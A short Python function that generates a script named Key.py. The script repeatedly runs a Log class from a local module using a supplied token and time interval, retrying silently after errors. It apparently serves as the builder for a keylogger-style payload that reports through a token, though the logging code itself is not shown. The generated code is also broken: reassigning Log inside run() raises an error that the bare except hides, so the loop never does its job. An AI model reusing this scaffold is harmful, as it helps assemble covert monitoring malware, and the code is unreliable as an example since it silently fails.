def build_t(token,time_interval):
	with open("Key.py","w+") as file:
		file.write("from Utils.utils import Log \n")
		file.write("from time import sleep\n")
		file.write(f"""
def run():
	while 1:
		try:
			Log = Log('{token}',{time_interval})
			""")
		file.write("Log.Run()")
		file.write("""
		except Exception:
			sleep(120)
			""")
		file.write(""" 
run()
	""")
		file.close()